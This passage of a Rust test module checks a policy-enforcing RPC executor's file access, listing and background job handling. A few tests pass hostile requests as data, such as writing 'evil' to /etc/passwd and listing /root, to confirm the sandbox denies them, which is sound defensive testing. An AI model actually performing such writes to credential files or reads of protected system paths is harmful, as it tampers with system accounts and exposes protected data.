    async fn test_read_denied_by_policy() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-9".into(),
            action: Action::Read {
                path: "/etc/hostname".into(),
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Denied { reason, .. } => {
                assert!(reason.contains("deny") || reason.contains("not allowed"));
            }
            _ => panic!("expected denied, got {:?}", resp.result),
        }
    }

    #[tokio::test]
    async fn test_write_denied_by_policy() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-10".into(),
            action: Action::Write {
                path: "/etc/passwd".into(),
                data: b"evil".to_vec(),
                mode: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Denied { .. } => {}
            _ => panic!("expected denied, got {:?}", resp.result),
        }
    }

    #[tokio::test]
    async fn test_list_denied_by_policy() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-11".into(),
            action: Action::List {
                path: "/root".into(),
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Denied { .. } => {}
            _ => panic!("expected denied, got {:?}", resp.result),
        }
    }

    #[tokio::test]
    async fn test_read_allowed_with_policy() {
        // Canonicalize temp dir (on macOS, /tmp → /private/tmp, env::temp_dir may not be canonical)
        let tmp_base = std::fs::canonicalize(std::env::temp_dir()).unwrap();
        let tmp_base_str = tmp_base.to_string_lossy();
        let yaml = format!(
            "spec:\n  commands:\n    allow:\n      - pattern: \".*\"\n  filesystem:\n    allow:\n      - path: \"{tmp_base_str}\"\n  resources:\n    maxOutputBytes: 1024\n    timeoutSeconds: 2\n"
        );
        let policy = RpcPolicy::from_yaml(&yaml).unwrap();
        let audit = Arc::new(TestAuditLogger::new());
        let exec = Executor::new(
            Arc::new(RwLock::new(policy)),
            audit.clone(),
            "test-key".into(),
        );

        // Create a temp file
        let tmp_file = tmp_base.join("rf_test_read.txt");
        tokio::fs::write(&tmp_file, b"hello world").await.unwrap();

        let req = Request {
            id: "req-12".into(),
            action: Action::Read {
                path: tmp_file.to_string_lossy().into(),
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Success { stdout, .. } => {
                use base64::Engine;
                let decoded = base64::engine::general_purpose::STANDARD
                    .decode(stdout)
                    .unwrap();
                assert_eq!(decoded, b"hello world");
            }
            _ => panic!("expected success, got {:?}", resp.result),
        }

        let _ = tokio::fs::remove_file(&tmp_file).await;
    }

    #[tokio::test]
    async fn test_write_and_list_allowed() {
        // Canonicalize temp dir (on macOS, /tmp → /private/tmp)
        let tmp_base = std::fs::canonicalize(std::env::temp_dir()).unwrap();
        let tmp_base_str = tmp_base.to_string_lossy();
        let yaml = format!(
            "spec:\n  commands:\n    allow:\n      - pattern: \".*\"\n  filesystem:\n    allow:\n      - path: \"{tmp_base_str}\"\n  resources:\n    maxOutputBytes: 1024\n    timeoutSeconds: 2\n"
        );
        let policy = RpcPolicy::from_yaml(&yaml).unwrap();
        let audit = Arc::new(TestAuditLogger::new());
        let exec = Executor::new(
            Arc::new(RwLock::new(policy)),
            audit.clone(),
            "test-key".into(),
        );

        let test_dir = tmp_base.join("rf_test_dir");
        let _ = tokio::fs::create_dir(&test_dir).await;

        // Write a file
        let test_file = test_dir.join("test.txt");
        let req = Request {
            id: "req-13".into(),
            action: Action::Write {
                path: test_file.to_string_lossy().into(),
                data: b"file content".to_vec(),
                mode: Some(0o644),
            },
            timeout_ms: None,
        };
        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Success { stdout, .. } => {
                assert!(stdout.contains("wrote 12 bytes"));
            }
            _ => panic!("expected success for write, got {:?}", resp.result),
        }

        // List directory
        let req = Request {
            id: "req-14".into(),
            action: Action::List {
                path: test_dir.to_string_lossy().into(),
            },
            timeout_ms: None,
        };
        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Success { stdout, .. } => {
                assert!(stdout.contains("test.txt"));
            }
            _ => panic!("expected success for list, got {:?}", resp.result),
        }

        // Cleanup
        let _ = tokio::fs::remove_dir_all(&test_dir).await;
    }

    #[tokio::test]
    async fn test_background_exec_and_wait() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        // Start background job
        let req = Request {
            id: "req-bg-1".into(),
            action: Action::BackgroundExec {
                command: "echo background-output".into(),
                env: HashMap::new(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        let job_id = match &resp.result {
            RpcResult::JobStarted { job_id, pid: _ } => job_id.clone(),
            _ => panic!("expected JobStarted, got {:?}", resp.result),
        };

        // Wait for job
        let req = Request {
            id: "req-bg-2".into(),
            action: Action::JobWait {
                job_id: job_id.clone(),
            },
            timeout_ms: None,
        };
        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::JobStatus {
                running,
                exit_code,
                stdout,
                ..
            } => {
                assert!(!running);
                assert_eq!(*exit_code, Some(0));
                assert!(stdout.as_ref().unwrap().contains("background-output"));
            }
            _ => panic!("expected JobStatus, got {:?}", resp.result),
        }
    }

    #[tokio::test]
    async fn test_background_exec_query_unknown() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-bg-3".into(),
            action: Action::JobQuery {
                job_id: "nonexistent".into(),
            },
            timeout_ms: None,
        };
        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Error { message } => {
                assert!(message.contains("unknown job"));
            }
            _ => panic!("expected error, got {:?}", resp.result),
        }
    }
}
